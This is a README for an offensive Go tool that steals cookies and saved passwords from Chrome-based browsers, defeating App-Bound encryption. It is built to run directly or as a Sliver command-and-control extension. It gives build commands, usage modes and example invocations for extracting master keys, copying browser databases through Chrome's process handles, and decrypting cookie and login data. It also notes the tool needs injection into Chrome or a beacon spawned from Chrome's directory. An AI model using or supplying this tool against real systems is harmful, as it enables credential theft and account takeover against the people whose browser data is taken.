# go-cookie-monster

Go-based program for stealing chrome-based browser cookies and passwords, with App-Bound Key support. For use as direct execution or via a Sliver extension.

Credits: [KingOfTheNOPs/cookie-monster](https://github.com/KingOfTheNOPs/cookie-monster)

:rotating_light: The catch is your process must be running out of web browser's application directory. i.e. must inject into Chrome or spawn a beacon from the same directory as Chrome.

## Build

```bash
# build (EXE)
make exe

# build shared library (DLL)
make dll
```

## Usage

Modes
- `keys`: attempt to obtain master and appbound keys
- `files`: attempt to copy databases via a chrome process's handles, fallback to disk
- `cookies`: decrypt the cookies db
- `logindata`: decrypt the login data db

```
Usage of go-cookie-monster [all|keys|files|cookies|logindata]:
  -dbpath string
        path to the database (required in 'cookies' mode)
  -key string
        decryption key (required in 'cookies' mode)
  -outputdir string
        output directory for files (used in 'files' mode)
  -statefile string
        path to the Local State file (used in 'keys' mode)
```

## Examples

```bash
# all modes
.\go-cookie-monster.exe

# get master and/or app-bound keys
.\go-cookie-monster.exe keys

# get a copy of the databases
.\go-cookie-monster.exe files -outputdir "c:\windows\temp"

# decrypt database copies
.\go-cookie-monster.exe cookies -key "\xHH\xHH\xHH..." -dbpath "c:\windows\temp\cookies.db"
```